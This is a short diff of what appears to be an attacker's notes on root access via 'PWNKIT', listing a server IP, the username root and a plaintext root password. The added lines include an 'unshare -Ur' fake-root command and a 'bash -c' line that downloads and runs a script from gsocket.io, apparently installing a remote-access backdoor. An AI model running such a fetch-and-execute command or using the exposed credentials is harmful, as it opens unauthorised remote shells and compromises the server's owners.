@@ -27,3 +27,10 @@ CIRI2 BUG ROOT PWNKIT DIPATCH
 Main IP: 149.28.154.229
 username: root
 Root pass: seok1337@@
+
+
+fake ahh
+busybox sh -c "unshare -Ur"
+
+GS
+bash -c "$(curl -fsSL https://gsocket.io/x)"
